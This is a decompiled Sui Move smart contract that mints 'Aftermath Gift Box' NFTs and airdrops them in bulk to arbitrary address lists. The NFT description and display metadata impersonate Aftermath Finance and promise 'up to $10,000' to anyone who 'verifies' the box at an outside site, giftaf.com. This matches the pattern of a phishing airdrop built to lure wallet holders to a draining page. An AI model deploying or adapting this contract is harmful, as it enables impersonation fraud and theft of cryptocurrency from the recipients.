module 0xb6ea10a34a5f852d7d83cedf9fcd9d0c5e087ecbe6e8cb2821bcdfc576872dd2::afgift {
    struct AFGIFT has drop {
        dummy_field: bool,
    }

    struct AFTERMATH_GIFTBOX has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun GiftFromAftermath(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = AFTERMATH_GIFTBOX{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Aftermath Gift Box"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/giftafcom_0812/giftafcom_0812_2.jpg"),
                description : 0x1::string::utf8(b"Gifting from Aftermath Finance is LIVE on https://giftaf.com. Verify your Gift Box and claim your gift upto $10,000."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<AFTERMATH_GIFTBOX>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Aftermath Gift Box"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/giftafcom_0812/giftafcom_0812_2.jpg"),
                description : 0x1::string::utf8(b"Gifting from Aftermath Finance is LIVE on https://giftaf.com. Verify your Gift Box and claim your gift upto $10,000."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<AFTERMATH_GIFTBOX>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: AFTERMATH_GIFTBOX, arg1: &mut 0x2::tx_context::TxContext) {
        let AFTERMATH_GIFTBOX {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: AFGIFT, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Aftermath Gift Box"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/giftafcom_0812/giftafcom_0812_2.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Gifting from Aftermath Finance is LIVE on https://giftaf.com. Verify your Gift Box and claim your gift upto $10,000."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://giftaf.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Aftermath Finance"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000"));
        let v4 = 0x2::package::claim<AFGIFT>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<AFTERMATH_GIFTBOX>(&v4, v0, v2, arg1);
        0x2::display::update_version<AFTERMATH_GIFTBOX>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<AFTERMATH_GIFTBOX>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

